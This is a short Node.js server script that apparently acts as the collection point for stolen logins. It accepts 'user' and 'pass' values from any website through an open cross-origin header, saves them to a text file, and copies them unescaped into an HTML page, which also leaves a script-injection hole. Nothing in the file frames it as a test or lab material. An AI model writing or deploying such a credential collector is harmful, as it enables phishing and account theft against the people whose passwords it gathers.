var http = require('http');
var url = require('url');
var fs = require('fs');

http.createServer(function(req, res) {
	res.setHeader('Access-Control-Allow-Origin', '*');
	var json = url.parse(req.url, true).query;

	fs.writeFile('ll.txt', 'user：' + json.user + '<br>pass：' + json.pass, function(err) {
		if(err) throw err
	})

	fs.readFile('ll.txt', 'utf8', function(err, data) {
		console.log(data)
		fs.writeFile('aaa.html', data, function(err) {
			if(err) throw err
		})
		console.log('成功')
	})

	res.end();

}).listen(8080)